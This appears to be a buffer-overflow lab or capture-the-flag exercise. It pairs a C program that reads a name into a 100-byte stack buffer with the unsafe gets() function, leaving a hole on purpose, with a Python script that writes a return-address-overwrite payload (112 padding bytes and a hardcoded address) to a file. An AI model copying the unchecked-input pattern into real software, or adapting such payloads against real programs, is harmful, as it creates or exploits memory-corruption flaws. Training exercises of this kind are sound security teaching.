#include <stdio.h>

// Expected output:
// Congratulations! You won
//
// Condition:
// Cant use -z execstack

// compile with the -w flag
char *gets(char *s);

void win(void) { printf("Congratulations! You won\n"); }

void greet(void) {
  char name[100];
  printf("Enter your name: ");
  gets(name);
}

int main(int argc, char **argv) {
  greet();
  return 0;
}

def p32(x):
    return x.to_bytes(4, "little")
payload=b"A"*112+p32(0x5655620d)+b"\x00"
with open('badfile', 'wb') as f:
    f.write(payload)
